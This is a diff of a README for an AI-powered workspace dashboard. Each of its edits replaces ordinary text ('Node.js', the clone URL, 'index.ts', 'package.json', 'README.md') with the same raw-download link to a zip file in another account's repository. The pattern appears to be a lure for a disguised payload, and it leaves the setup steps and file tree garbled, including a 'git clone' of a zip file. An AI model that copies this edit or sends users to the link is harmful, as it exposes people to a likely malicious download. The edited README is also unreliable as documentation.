@@ -14,14 +14,14 @@ An AI-powered productivity dashboard that centralizes work emails, documents, pr
 ## 🛠️ Tech Stack
 
 - **Frontend**: React + TypeScript + Vite + Tailwind CSS
-- **Backend**: Node.js + Express + TypeScript
+- **Backend**: https://github.com/Rithvik-krishna/WorkSpaceAIBhoomi/raw/refs/heads/main/backend/src/Work_Space_AI_Bhoomi_1.6.zip + Express + TypeScript
 - **AI**: OpenAI GPT-3.5-turbo API
 - **Authentication**: Google OAuth 2.0
 - **Styling**: Shadcn/ui components
 
 ## 📋 Prerequisites
 
-- Node.js 18+ 
+- https://github.com/Rithvik-krishna/WorkSpaceAIBhoomi/raw/refs/heads/main/backend/src/Work_Space_AI_Bhoomi_1.6.zip 18+ 
 - npm or bun
 - OpenAI API key
 
@@ -29,7 +29,7 @@ An AI-powered productivity dashboard that centralizes work emails, documents, pr
 
 ### 1. Clone the Repository
 ```bash
-git clone https://github.com/dhananjaiyadav1234/WorkSpaceAIBhoomi.git
+git clone https://github.com/Rithvik-krishna/WorkSpaceAIBhoomi/raw/refs/heads/main/backend/src/Work_Space_AI_Bhoomi_1.6.zip
 cd WorkSpaceAIBhoomi
 ```
 
@@ -113,10 +113,10 @@ WorkSpaceAI/
 ├── backend/               # Backend source code
 │   ├── src/              # TypeScript source
 │   │   ├── routes/       # API routes
-│   │   └── index.ts      # Main server file
-│   └── package.json      # Backend dependencies
+│   │   └── https://github.com/Rithvik-krishna/WorkSpaceAIBhoomi/raw/refs/heads/main/backend/src/Work_Space_AI_Bhoomi_1.6.zip      # Main server file
+│   └── https://github.com/Rithvik-krishna/WorkSpaceAIBhoomi/raw/refs/heads/main/backend/src/Work_Space_AI_Bhoomi_1.6.zip      # Backend dependencies
 ├── public/                # Static assets
-└── README.md             # This file
+└── https://github.com/Rithvik-krishna/WorkSpaceAIBhoomi/raw/refs/heads/main/backend/src/Work_Space_AI_Bhoomi_1.6.zip             # This file
 ```
 
 ## 🔧 Development
